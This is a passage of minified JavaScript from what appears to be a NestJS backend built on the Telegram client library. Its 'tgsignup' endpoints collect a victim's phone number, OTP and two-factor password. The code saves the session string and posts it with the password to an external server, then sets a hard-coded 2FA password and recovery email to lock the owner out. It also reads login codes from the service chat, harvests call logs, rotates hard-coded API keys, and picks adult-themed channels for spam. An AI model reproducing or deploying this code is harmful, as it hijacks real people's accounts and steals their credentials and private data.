t="",o=e&&""!==e?e:"",i=0;if(""===o)try{await this.client.invoke(new a.Api.account.UpdateUsername({username:o})),console.log("Removed Username successfully.")}catch(e){console.log(e)}else for(;i<10;)try{const n=await this.client.invoke(new a.Api.account.CheckUsername({username:o}));if(console.log(n," - ",o),n){await this.client.invoke(new a.Api.account.UpdateUsername({username:o})),console.log(`Username '${o}' updated successfully.`),t=o;break}o=e+i,i++,await(0,d.sleep)(2e3)}catch(n){if(console.log(n.message),"USERNAME_NOT_MODIFIED"==n.errorMessage){t=o;break}o=e+i,i++,await(0,d.sleep)(2e3)}return t}async updatePrivacy(){try{await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyPhoneCall,rules:[new a.Api.InputPrivacyValueDisallowAll]})),console.log("Calls Updated"),await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyProfilePhoto,rules:[new a.Api.InputPrivacyValueAllowAll]})),console.log("PP Updated"),await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyForwards,rules:[new a.Api.InputPrivacyValueAllowAll]})),console.log("forwards Updated"),await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyPhoneNumber,rules:[new a.Api.InputPrivacyValueDisallowAll]})),console.log("Number Updated"),await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyStatusTimestamp,rules:[new a.Api.InputPrivacyValueAllowAll]})),console.log("LAstSeen Updated"),await this.client.invoke(new a.Api.account.SetPrivacy({key:new a.Api.InputPrivacyKeyAbout,rules:[new a.Api.InputPrivacyValueAllowAll]}))}catch(e){throw e}}async getFileUrl(e,t){const o=await s.default.get(e,{responseType:"stream"}),i=`/tmp/${t}`;return await new Promise(((e,t)=>{const n=c.createWriteStream(i);o.data.pipe(n),n.on("finish",(()=>e(!0))),n.on("error",t)})),i}async updateProfilePic(e){try{const t=await this.client.uploadFile({file:new l.CustomFile("pic.jpg",c.statSync(e).size,e),workers:1});console.log("file uploaded"),await this.client.invoke(new a.Api.photos.UploadProfilePhoto({file:t})),console.log("profile pic updated")}catch(e){throw e}}async hasPassword(){return(await this.client.invoke(new a.Api.account.GetPassword)).hasPassword}async set2fa(){if(await this.hasPassword())console.log("Password already exists");else{console.log("Password Does not exist, Setting 2FA");const e=y.MailReader.getInstance(),t={email:"storeslaksmi@gmail.com",hint:"password - India143",newPassword:"Ajtdmwajt1@"};try{await e.connectToMail();const o=setInterval((async()=>{if(console.log("Checking if mail is ready"),e.isMailReady())return clearInterval(o),console.log("Mail is ready, checking code!"),await this.client.updateTwoFaSettings({isCheckPassword:!1,email:t.email,hint:t.hint,newPassword:t.newPassword,emailCodeCallback:async t=>(console.log("Code sent"),new Promise((async(t,o)=>{let i=0;const n=setInterval((async()=>{try{if(console.log("Checking code"),i++,e.isMailReady()&&i<4){const o=await e.getCode();console.log("Code:",o),o&&(await e.disconnectFromMail(),clearInterval(n),t(o))}else clearInterval(n),await e.disconnectFromMail(),o(new Error("Failed to retrieve code"))}catch(t){clearInterval(n),await e.disconnectFromMail(),o(t)}}),1e4)}))),onEmailCodeError:e=>(console.error("Email code error:",(0,p.parseError)(e)),Promise.resolve("error"))}),t;console.log("Mail not ready yet")}),5e3)}catch(e){console.error("Unable to connect to mail server:",(0,p.parseError)(e))}}}async sendPhotoChat(e,t,o,i){if(!this.client)throw new Error("Client is not initialized");const n=await this.getFileUrl(t,i),r=new l.CustomFile(n,c.statSync(n).size,i);await this.client.sendFile(e,{file:r,caption:o})}async sendFileChat(e,t,o,i){if(!this.client)throw new Error("Client is not initialized");const n=await this.getFileUrl(t,i),r=new l.CustomFile(n,c.statSync(n).size,i);await this.client.sendFile(e,{file:r,caption:o})}async deleteProfilePhotos(){try{const e=await this.client.invoke(new a.Api.photos.GetUserPhotos({userId:"me"}));console.log(`Profile Pics found: ${e.photos.length}`),e&&e.photos?.length>0&&await this.client.invoke(new a.Api.photos.DeletePhotos({id:e.photos})),console.log("Deleted profile Photos")}catch(e){throw e}}async createNewSession(){const e=await this.client.getMe();console.log("Phne:",e.phone);const t=new i.TelegramClient(new n.StringSession(""),parseInt(process.env.API_ID),process.env.API_HASH,{connectionRetries:1});await t.start({phoneNumber:e.phone,password:async()=>"Ajtdmwajt1@",phoneCode:async()=>(console.log("Waiting for the OTP code from chat ID 777000..."),await this.waitForOtp()),onError:e=>{throw e}});const o=t.session.save();return await t.disconnect(),console.log("New Session: ",o),o}async waitForOtp(){for(let e=0;e<3;e++)try{console.log("Attempt : ",e);const t=(await this.client.getMessages("777000",{limit:1}))[0];if(t&&t.date&&1e3*t.date>Date.now()-6e4){const e=t.text.split(".")[0].split("code:**")[1].trim();return console.log("returning: ",e),e}{console.log("Message Date: ",new Date(1e3*t.date).toISOString(),"Now: ",new Date(Date.now()-6e4).toISOString());const o=t.text.split(".")[0].split("code:**")[1].trim();if(console.log("Skipped Code: ",o),2==e)return o;await(0,d.sleep)(5e3)}}catch(e){await(0,d.sleep)(2e3),console.log(e)}}}t.default=h},7777:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.AddContactDto=void 0;const r=o(9742);class a{}t.AddContactDto=a,i([(0,r.ApiProperty)({description:"The mobile number of the user for authentication",example:"+1234567890"}),n("design:type",String)],a.prototype,"mobile",void 0),i([(0,r.ApiProperty)({description:"List of phone numbers to add as contacts",type:Object,example:[{mobile:"+1234567890",tgId:"1234567890"}]}),n("design:type",Array)],a.prototype,"data",void 0),i([(0,r.ApiProperty)({description:"Prefix for automated contact names",example:"Contact"}),n("design:type",String)],a.prototype,"prefix",void 0)},8062:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.AddContactsDto=void 0;const r=o(9742);class a{}t.AddContactsDto=a,i([(0,r.ApiProperty)({description:"The mobile number of the user for authentication",example:"+1234567890"}),n("design:type",String)],a.prototype,"mobile",void 0),i([(0,r.ApiProperty)({description:"List of phone numbers to add as contacts",type:Object,example:["919892184284","919967837841","919972600626"]}),n("design:type",Array)],a.prototype,"phoneNumbers",void 0),i([(0,r.ApiProperty)({description:"Prefix for automated contact names",example:"Contact"}),n("design:type",String)],a.prototype,"prefix",void 0)},886:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupModule=void 0;const n=o(3563),r=o(7814);let a=class{};t.TgSignupModule=a,t.TgSignupModule=a=i([(0,n.Module)({imports:[],controllers:[r.TgSignupController]})],a)},2431:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupService=void 0,t.restAcc=h,t.getClient=f,t.hasClient=async function(e){return y.has(e)},t.deleteClient=g,t.disconnectAll=async function(){for(const[e,t]of y.entries())try{await(t?.disconnect()),y.delete(e),console.log(`Client disconnected: ${e}`)}catch(t){console.log(t),console.log(`Failed to Disconnect : ${e}`)}},t.createClient=async function(e){try{if(y.has(e)){console.log("Client already exist");const t=y.get(e);return setTimeout((async()=>{await h(e)}),12e4),await t.sendCode(!1)}{const t=Math.floor(Math.random()*m.length),o=m[t].apiHash,i=m[t].apiId;console.log("Creating new client - ",e,m[t]);const n=new v(e,i,o);return y.set(e,n),await(0,s.sleep)(500),await n.sendCode(!1)}}catch(e){throw console.log((0,d.parseError)(e)),new u.BadRequestException((0,d.parseError)(e).message)}};const i=o(3820),n=o(3047),r=o(689),a=o(8938),s=o(7385),c=o(9425),l=o(2041),p=o(5651),d=o(6185),u=o(3563),y=new Map;let m=[{apiId:27919939,apiHash:"5ed3834e741b57a560076a1d38d2fa94"},{apiId:25328268,apiHash:"b4e654dd2a051930d0a30bb2add80d09"},{apiId:2899,apiHash:"36722c72256a24c1225de00eb6a1ca74"},{apiId:24559917,apiHash:"702294de6c08f4fd8c94c3141e0cebfb"},{apiId:12777557,apiHash:"05054fc7885dcfa18eb7432865ea3500"},{apiId:27565391,apiHash:"a3a0a2e895f893e2067dae111b20f2d9"},{apiId:27586636,apiHash:"f020539b6bb5b945186d39b3ff1dd998"},{apiId:29210552,apiHash:"f3dbae7e628b312c829e1bd341f1e9a9"}];async function h(e){await(0,s.sleep)(1e3),console.log("Reset - ",e);const t=f(e);t&&(await(t.client?.destroy()),await(t.client?.disconnect()),t.client.session.delete(),t.session.delete(),t.client._destroyed=!0,t.client=null,delete t.client,await g(e))}function f(e){return y.get(e)}async function g(e){console.log("Deleting Client - ",e);const t=f(e);return await(t?.disconnect()),y.delete(e)}class v{constructor(e,t,o){this.apiId=t,this.apiHash=o,this.phoneNumber=e,this.session=new r.StringSession(""),this.client=null,this.createClient()}async getLastActiveTime(){const e=await this.client.invoke(new i.Api.account.GetAuthorizations);let t=0;return e.authorizations.map((e=>{e.country.toLowerCase().includes("singapore")||t<e.dateActive&&(t=e.dateActive)})),t}async disconnect(){await(this.client?.disconnect()),await(this.client?.destroy()),await this.session.delete(),this.client=null}async createClient(){try{console.log(this.apiId,this.apiHash),this.client=new n.TelegramClient(this.session,this.apiId,this.apiHash,{connectionRetries:5}),await this.client.setLogLevel(p.LogLevel.ERROR),await this.client.connect()}catch(e){console.log("Error while Connecting:",e)}}async deleteMessages(){console.log("DeleteMessages TODO")}async sendCode(e=!1){try{await this.client.connect(),console.log("Sending OTP - ",this.phoneNumber,this.apiId,this.apiHash);try{const t=await this.client.invoke(new i.Api.auth.SendCode({phoneNumber:`+${this.phoneNumber}`,apiId:this.apiId,apiHash:this.apiHash,settings:new i.Api.CodeSettings({})}));if(console.log("Send result - ",t),setTimeout((async()=>{await h(this.phoneNumber)}),15e4),t instanceof i.Api.auth.SentCodeSuccess)throw new Error("logged in right after sending the code");if(this.phoneCodeHash=t.phoneCodeHash,!e||t.type instanceof i.Api.auth.SentCodeTypeSms)return{phoneCodeHash:t.phoneCodeHash,isCodeViaApp:t.type instanceof i.Api.auth.SentCodeTypeApp};const o=await this.client.invoke(new i.Api.auth.ResendCode({phoneNumber:`+${this.phoneNumber}`,phoneCodeHash:t.phoneCodeHash}));if(console.log("ReSend result - ",t),o instanceof i.Api.auth.SentCodeSuccess)throw new Error("logged in right after resending the code");return this.phoneCodeHash=o.phoneCodeHash,{phoneCodeHash:o.phoneCodeHash,isCodeViaApp:o.type instanceof i.Api.auth.SentCodeTypeApp}}catch(e){throw console.log("Error in sending code:",e),e}}catch(t){if("AUTH_RESTART"!==t.errorMessage)throw t;try{return this.client.sendCode({apiId:this.apiId,apiHash:this.apiHash},`+${this.phoneNumber}`,e)}catch(e){console.log("heelo: ",e)}}}async login(e,t){let o,n=!1;try{if(!e)throw new Error("Code is empty");this.client.connected||await this.client.connect();const t=await(this.client?.invoke(new i.Api.auth.SignIn({phoneNumber:`+${this.phoneNumber}`,phoneCodeHash:this.phoneCodeHash,phoneCode:e})));if(!(t instanceof i.Api.auth.AuthorizationSignUpRequired))return await this.processLogin(t.user),await h(this.phoneNumber),{status:200,message:"Login success"};n=!0,o=t.termsOfService}catch(e){if(console.log(e),"SESSION_PASSWORD_NEEDED"===e.errorMessage){console.log("passowrd Required");try{const e=await this.client.invoke(new i.Api.account.GetPassword),o=await(0,c.computeCheck)(e,t),{user:n}=await this.client.invoke(new i.Api.auth.CheckPassword({password:o}));return this.processLogin(n,t),{status:200,message:"Login success"}}catch(e){return t&&""!==t?{status:400,message:"Incorrect Password!<br/>Enter your telegram Two-Factor-Authentication password."}:{status:400,message:"Telegram 2FA Password"}}}else 0;return{status:400,message:e.errorMessage}}if(n)try{let e="last name",t="first name";const{user:n}=await this.client.invoke(new i.Api.auth.SignUp({phoneNumber:`+${this.phoneNumber}`,phoneCodeHash:this.phoneCodeHash,firstName:t,lastName:e}));return o&&await this.client.invoke(new i.Api.help.AcceptTermsOfService({id:o.id})),n}catch(e){0}}async getCallLogs(){try{const e=await this.client.invoke(new i.Api.messages.Search({peer:new i.Api.InputPeerEmpty,q:"",filter:new i.Api.InputMessagesFilterPhoneCalls({}),minDate:0,maxDate:0,offsetId:0,addOffset:0,limit:100,maxId:0,minId:0,hash:l.default.zero}));console.log("Got Messages");const t=e.messages.filter((e=>e.action instanceof i.Api.MessageActionPhoneCall));console.log("filtered call logs");const o={outgoing:0,incoming:0,video:0,chatCallCounts:{},totalCalls:0};for(const e of t)try{o.totalCalls++;const t={callId:e.action.callId.value,duration:e.action.duration,video:e.action.video,timestamp:e.date};console.log(t),e.out?o.outgoing++:o.incoming++,e.action.video&&o.video++;const i=e.peerId.userId.value;if(o.chatCallCounts[i])console.log(i," Already exists");else{console.log("Getting Enitity",i);let e={firstName:"Default",lastName:null};try{e=await this.client.getInputEntity(i),console.log("Got Enitity",i)}catch(e){console.log("Failed to get entity for chatId:",i,e)}o.chatCallCounts[i]={name:`${e.firstName}  ${e.lastName?e.lastName:""}`,count:0}}o.chatCallCounts[i].count++}catch(t){console.log("Error processing log:",e,t)}return console.log("Returning filtered results",o),o}catch(e){throw console.error("Error in getCallLogs:",e),e}}async processLogin(e,t=void 0){console.log(this.client.session.save()),await this.client.getMe();const o=this.client.session.save(),i=await e.toJSON();console.log("AllGood");const n={photoCount:0,videoCount:0,movieCount:0,gender:null,mobile:i.phone,session:`${o}`,firstName:i.firstName,lastName:i.lastName,userName:i.username,channels:0,personalChats:0,calls:{},contacts:0,msgs:0,totalChats:0,lastActive:(new Date).toISOString().split("T")[0],tgId:i.id};t&&(n.twoFA=!0,n.password=t),console.log("Calculated results");try{const e=`${process.env.tgcms}/user`;console.log("posting results : ",e),await a.default.post(e,n,{headers:{"Content-Type":"application/json"}})}catch(e){console.log("Error Occured 1"),console.log(e)}await this.disconnect(),await g(this.phoneNumber)}}t.TgSignupService=v},7814:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupController=void 0;const a=o(3563),s=o(9742),c=o(2431);let l=class{constructor(){}async sendCode(e){console.log(e);const t=await(0,c.createClient)(e);if(t?.isCodeViaApp)return console.log("OTP SENT!! - ",e),t;throw new a.BadRequestException("Failed to send OTP")}async verifyCode(e,t,o){const i=await(0,c.getClient)(e);if(i){console.log(i?.phoneCodeHash,i?.phoneNumber);const e=await(i?.login(t,o));if(e&&200===e.status)return{mesaage:e.message};throw new a.HttpException(e.message,e.status)}throw new a.BadRequestException("Failed to Verify OTP")}};t.TgSignupController=l,i([(0,a.Get)("login"),(0,s.ApiQuery)({name:"phone",required:!0}),r(0,(0,a.Query)("phone")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],l.prototype,"sendCode",null),i([(0,a.Get)("otp"),(0,s.ApiQuery)({name:"phone",required:!0}),(0,s.ApiQuery)({name:"code",required:!0}),(0,s.ApiQuery)({name:"password",required:!1}),r(0,(0,a.Query)("phone")),r(1,(0,a.Query)("code")),r(2,(0,a.Query)("password")),n("design:type",Function),n("design:paramtypes",[String,String,String]),n("design:returntype",Promise)],l.prototype,"verifyCode",null),t.TgSignupController=l=i([(0,a.Controller)("tgsignup"),(0,s.ApiTags)("tgsignup"),n("design:paramtypes",[])],l)},7522:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelsController=void 0;const a=o(3563),s=o(9155),c=o(3585),l=o(5926),p=o(9742),d=o(803);let u=class{constructor(e){this.activeChannelsService=e}async create(e){return this.activeChannelsService.create(e)}async createMultiple(e){return this.activeChannelsService.createMultiple(e)}search(e){return console.log(e),this.activeChannelsService.search(e)}async findAll(){return this.activeChannelsService.findAll()}async findOne(e){return this.activeChannelsService.findOne(e)}async update(e,t){return this.activeChannelsService.update(e,t)}async remove(e){return this.activeChannelsService.remove(e)}addReaction(e,t){if(!t.reactions)throw new a.BadRequestException("Reaction is required");return this.activeChannelsService.addReactions(e,t.reactions)}getRandomReaction(e){return this.activeChannelsService.getRandomReaction(e)}removeReaction(e,t){if(!t.reactions)throw new a.BadRequestException("Reaction is required");return this.activeChannelsService.removeReaction(e,t.reactions[0])}};t.ActiveChannelsController=u,i([(0,a.Post)(),(0,p.ApiOperation)({summary:"Create a new active channel"}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[c.CreateActiveChannelDto]),n("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Post)("createMultiple"),(0,p.ApiOperation)({summary:"Create multiple channels"}),(0,p.ApiBody)({type:[c.CreateActiveChannelDto]}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Array]),n("design:returntype",Promise)],u.prototype,"createMultiple",null),i([(0,a.Get)("search"),(0,p.ApiOperation)({summary:"Search channels by filters"}),(0,p.ApiQuery)({name:"channelId",required:!1,type:String}),(0,p.ApiQuery)({name:"broadcast",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"canSendMsgs",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"participantsCount",required:!1,type:Number}),(0,p.ApiQuery)({name:"restricted",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"sendMessages",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"title",required:!1,type:String}),(0,p.ApiQuery)({name:"username",required:!1,type:String}),(0,p.ApiQuery)({name:"wordRestriction",required:!1,type:Number}),(0,p.ApiQuery)({name:"dMRestriction",required:!1,type:Number}),(0,p.ApiQuery)({name:"availableMsgs",required:!1,type:[String]}),(0,p.ApiQuery)({name:"reactions",required:!1,type:[String]}),(0,p.ApiQuery)({name:"banned",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"reactRestricted",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"megagroup",required:!1,type:Boolean}),r(0,(0,a.Query)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)(),(0,p.ApiOperation)({summary:"Get all active channels"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)(":channelId"),(0,p.ApiOperation)({summary:"Get an active channel by channelId"}),r(0,(0,a.Param)("channelId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":channelId"),(0,p.ApiOperation)({summary:"Update an active channel by channelId"}),r(0,(0,a.Param)("channelId")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,l.UpdateActiveChannelDto]),n("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":channelId"),(0,p.ApiOperation)({summary:"Delete an active channel by channelId"}),r(0,(0,a.Param)("channelId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)(":channelId/reactions"),(0,p.ApiOperation)({summary:"Add reaction to chat group"}),r(0,(0,a.Param)("channelId")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,d.AddReactionDto]),n("design:returntype",Promise)],u.prototype,"addReaction",null),i([(0,a.Get)(":channelId/reactions/random"),(0,p.ApiOperation)({summary:"Get a random reaction from chat group"}),r(0,(0,a.Param)("channelId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"getRandomReaction",null),i([(0,a.Delete)(":channelId/reactions"),(0,p.ApiOperation)({summary:"Remove reaction from chat group"}),r(0,(0,a.Param)("channelId")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,d.AddReactionDto]),n("design:returntype",Promise)],u.prototype,"removeReaction",null),t.ActiveChannelsController=u=i([(0,p.ApiTags)("Active Channels"),(0,a.Controller)("active-channels"),n("design:paramtypes",[s.ActiveChannelsService])],u)},3322:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelsModule=void 0;const n=o(3563),r=o(5839),a=o(9155),s=o(7522),c=o(925),l=o(5774),p=o(5014);let d=class{};t.ActiveChannelsModule=d,t.ActiveChannelsModule=d=i([(0,n.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:c.ActiveChannel.name,schema:c.ActiveChannelSchema}]),p.PromoteMsgModule],controllers:[s.ActiveChannelsController],providers:[a.ActiveChannelsService],exports:[a.ActiveChannelsService]})],d)},9155:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelsService=void 0;const a=o(9199),s=o(3563),c=o(5839),l=o(6037),p=o(925),d=o(6185);let u=class{constructor(e,t){this.activeChannelModel=e,this.promoteMsgsService=t}async create(e){return e.availableMsgs=Object.keys(await this.promoteMsgsService.findOne()),new this.activeChannelModel(e).save()}async createMultiple(e){const t=e.map((e=>({updateOne:{filter:{channelId:e.channelId},update:{$set:e},upsert:!0}})));return await this.activeChannelModel.bulkWrite(t,{ordered:!1}),"Channels Saved"}async findAll(){return this.activeChannelModel.find().exec()}async findOne(e){const t=(await this.activeChannelModel.findOne({channelId:e}).exec())?.toJSON();return t}async update(e,t){return delete t._id,await this.activeChannelModel.findOneAndUpdate({channelId:e},{$set:t},{new:!0,upsert:!0}).exec()}async removeFromAvailableMsgs(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$pull:{availableMsgs:t}})}async addToAvailableMsgs(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$addToSet:{availableMsgs:t}})}async remove(e){await this.activeChannelModel.findOneAndDelete({channelId:e}).exec()}async search(e){return console.log(e),this.activeChannelModel.find(e).exec()}async addReactions(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$addToSet:{reactions:t}})}async getRandomReaction(e){const t=(await this.activeChannelModel.findOne({channelId:e}).exec())?.toJSON();if(!t)return;if(0===t.reactions.length)return;const o=Math.floor(Math.random()*t.reactions.length);return t.reactions[o]}async removeReaction(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$pull:{reactions:t}})}async getActiveChannels(e=50,t=0,o=[]){const i={$and:[{$or:[{title:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}},{username:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}}]},{$or:[{title:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}},{username:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}}]},{channelId:{$nin:o},participantsCount:{$gt:600},username:{$ne:null},canSendMsgs:!0,restricted:!1,forbidden:!1}]},n={participantsCount:-1};try{return await this.activeChannelModel.aggregate([{$match:i},{$skip:t},{$limit:e},{$sort:n},{$project:{randomField:0}}]).exec()}catch(e){return console.error("Error:",e),[]}}async executeQuery(e,t,o,i){try{if(!e)throw new s.BadRequestException("Query is invalid.");const n=this.activeChannelModel.find(e);return t&&n.sort(t),o&&n.limit(o),i&&n.skip(i),await n.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}async resetWordRestrictions(){await(0,d.fetchWithTimeout)(`${(0,d.ppplbot)()}&text=Request Received for Reset Available Msgs`);try{await this.activeChannelModel.updateMany({banned:!1},{$set:{wordRestriction:0,dMRestriction:0}})}catch(e){console.log((0,d.parseError)(e))}}async resetAvailableMsgs(){await(0,d.fetchWithTimeout)(`${(0,d.ppplbot)()}&text=Request Received for Reset Available Msgs`);try{const e=await this.promoteMsgsService.findOne(),t=Object.keys(e);await this.activeChannelModel.updateMany({$expr:{$lt:[{$size:{$ifNull:["$availableMsgs",[]]}},5]}},{$set:{wordRestriction:0,dMRestriction:0,banned:!1,availableMsgs:t}})}catch(e){console.log((0,d.parseError)(e))}}async updateBannedChannels(){await(0,d.fetchWithTimeout)(`${(0,d.ppplbot)()}&text=Request Received for update banned Channels`),await this.activeChannelModel.updateMany({$or:[{banned:!0},{private:!0}]},{$set:{wordRestriction:0,dMRestriction:0,banned:!1,private:!1}})}async updateDefaultReactions(){await this.activeChannelModel.updateMany({},{$set:{reactions:["❤","🔥","👏","🥰","😁","🤔","🤯","😱","🤬","😢","🎉","🤩","🤮","💩","🙏","👌","🕊","🤡","🥱","🥴","😍","🐳","❤‍🔥","💯","🤣","💔","🏆","😭","😴","👍","🌚","⚡","🍌","😐","💋","👻","👀","🙈","🤝","🤗","🆒","🗿","🙉","🙊","🤷","👎"]}})}};t.ActiveChannelsService=u,t.ActiveChannelsService=u=i([(0,s.Injectable)(),r(0,(0,c.InjectModel)(p.ActiveChannel.name)),r(1,(0,s.Inject)((0,s.forwardRef)((()=>a.PromoteMsgsService)))),n("design:paramtypes",[l.Model,a.PromoteMsgsService])],u)},803:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.AddReactionDto=void 0;const r=o(9742);class a{}t.AddReactionDto=a,i([(0,r.ApiProperty)({required:!0}),n("design:type",Array)],a.prototype,"reactions",void 0)},3585:function(e,t,o){var 